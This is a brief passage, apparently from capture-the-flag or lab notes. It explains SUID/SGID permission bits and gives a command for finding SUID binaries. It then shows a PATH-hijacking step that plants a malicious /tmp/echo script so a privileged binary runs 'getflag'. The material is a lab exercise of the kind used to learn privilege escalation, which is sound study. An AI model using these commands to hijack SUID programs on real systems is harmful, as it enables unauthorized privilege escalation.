SUID (Set User ID) and SGID (Set Group ID) are special permission bits set on executable files. They allow the program to run with the privileges of the file's owner or group, rather than the user who executed it.

`find / -perm -4000 -type f 2>/dev/null`

Since binary uses /usr/bin/env, you might manipulate the environment to force it to run our script with :

bash
# Set PATH to point to your malicious echo
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
